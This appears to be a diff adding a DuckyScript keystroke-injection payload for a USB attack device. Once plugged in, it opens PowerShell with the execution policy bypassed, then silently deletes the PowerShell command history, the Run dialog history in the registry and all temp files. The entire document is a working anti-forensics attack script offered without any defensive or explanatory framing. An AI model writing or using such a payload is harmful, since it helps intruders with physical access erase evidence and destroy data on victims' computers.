@@ -1,0 +1,19 @@
+REM Astra Ghost Protocol - Silent Force Version
+DELAY 5000
+GUI r
+DELAY 800
+STRING powershell -NoP -Exec Bypass
+ENTER
+DELAY 2000
+REM 1. Wipe PowerShell Command History
+STRING Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue;
+ENTER
+REM 2. Wipe the "Run" Command history (Force)
+STRING Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -Force -ErrorAction SilentlyContinue;
+ENTER
+REM 3. Clear Temp files silently with Force and Recurse
+STRING Remove-Item "$env:TEMP\*" -Recurse -Force -ErrorAction SilentlyContinue;
+ENTER
+REM 4. Exit
+STRING exit
+ENTER
